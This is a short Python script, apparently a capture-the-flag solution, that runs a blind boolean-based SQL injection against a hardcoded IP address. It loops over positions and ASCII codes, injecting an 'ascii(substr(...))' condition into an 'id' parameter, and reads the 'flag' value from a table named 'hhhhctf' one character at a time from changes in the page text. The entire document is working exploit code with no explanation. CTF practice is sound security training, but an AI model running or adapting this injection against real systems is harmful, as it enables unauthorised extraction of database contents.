import requests
a = []
for k in range(1,30):
    for i in range(48 ,126):
        url = "http://45.32.25.65/nweb/sqli2/?id=1" \
              " and ascii(substr((select flag from hhhhctf limit 0,1),"+str(k)+",1))="+str(i)
        re = requests.get(url)
        if 'it must return username' not in re.text:
            print(chr(i))
            a.append(chr(i))
            break
b = ''.join(a)
print(b)